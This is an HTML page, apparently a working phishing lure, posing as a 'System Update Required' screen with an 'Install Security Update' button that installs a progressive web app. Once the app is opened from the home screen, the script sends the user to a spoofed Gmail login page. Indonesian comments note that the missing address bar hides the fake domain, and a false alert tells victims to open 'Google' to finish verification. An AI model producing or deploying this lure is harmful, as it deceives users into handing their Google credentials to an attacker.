<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="manifest" href="manifest.json">
<style>
  body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 85%; display: none; }
  #status { color: #9aa0a6; margin-bottom: 30px; font-size: 14px;}
</style>
</head>
<body>
  <h2>System Update Required</h2>
  <p id="status">Scanning device compatibility...</p>
  
  <!-- Tombol ini cuma muncul kalo Chrome ngizinin instalasi -->
  <button class="btn" id="installBtn">Install Security Update</button>

<script>
// Cek jika aplikasi dibuka dari Home Screen (Mode Standalone)
if (window.matchMedia('(display-mode: standalone)').matches) {
    // IMPACT: Redirect langsung ke halaman login palsu lu
    // Karena tidak ada Address Bar, user tidak bisa melihat domain ologoligature.github.io
    window.location.href = "https://ologoligature.github.io/login-gmail-spoof.html";
}

let deferredPrompt;
window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    deferredPrompt = e;
    document.getElementById('installBtn').style.display = 'block';
});

document.getElementById('installBtn').addEventListener('click', async () => {
    if (deferredPrompt) {
        deferredPrompt.prompt();
        // Setelah klik install, kita beri instruksi palsu
        const { outcome } = await deferredPrompt.userChoice;
        if (outcome === 'accepted') {
            alert("Security Module Installed. Please open 'Google' from your home screen to complete verification.");
        }
    }
});
</script>
</body>
</html>
